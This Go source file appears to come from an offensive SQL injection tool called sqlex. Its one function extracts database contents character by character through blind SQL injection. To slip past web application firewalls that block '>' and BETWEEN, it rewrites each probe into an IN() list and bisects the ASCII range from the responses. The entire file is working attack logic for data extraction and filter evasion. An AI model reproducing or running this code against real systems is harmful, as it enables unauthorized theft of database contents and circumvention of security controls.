package extract

import (
	"context"
	"fmt"
	"strings"

	"github.com/SobhanYasami/sqlex/internal/config"
	"github.com/SobhanYasami/sqlex/internal/inject"
	"github.com/SobhanYasami/sqlex/internal/payloads"
	"github.com/SobhanYasami/sqlex/internal/request"
)

// inOpSearch uses SQL IN() operator — for WAFs that filter both '>' and BETWEEN.
// Bisects using IN chunks of the ASCII range.
func inOpSearch(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	dataPL, queryable string,
	pos, lo, hi int,
) (rune, error) {
	// Binary search using IN() membership: is char IN lower half?
	for lo <= hi {
		select {
		case <-ctx.Done():
			return 0, ctx.Err()
		default:
		}
		mid := (lo + hi) / 2
		// Build IN list for lower half [lo..mid]
		var items []string
		for i := lo; i <= mid; i++ {
			items = append(items, fmt.Sprintf("%d", i))
		}
		inList := strings.Join(items, ",")
		probe := payloads.RenderProbe(dataPL, queryable, pos, mid)
		// Replace the equality check with IN(...) membership
		inProbe := strings.Replace(probe,
			fmt.Sprintf("=%d", mid),
			fmt.Sprintf(" IN(%s)", inList), 1)
		expr := strings.ReplaceAll(
			strings.ReplaceAll(ectx.Vector, "[INFERENCE]", inProbe),
			"[SLEEPTIME]", fmt.Sprintf("%d", int(cfg.TimeSec.Seconds())),
		)
		resp, err := inject.Expression(ctx, cfg, rs, client, injectCtx(ectx), expr, false)
		if err != nil {
			return 0, err
		}
		if evalHit(ectx, rs, resp, cfg) {
			// char is in [lo..mid], narrow upper
			hi = mid
		} else {
			// char is in [mid+1..hi]
			lo = mid + 1
		}
		if lo == hi {
			break
		}
	}
	if lo < 32 || lo > 127 {
		return ' ', nil
	}
	return rune(lo), nil
}
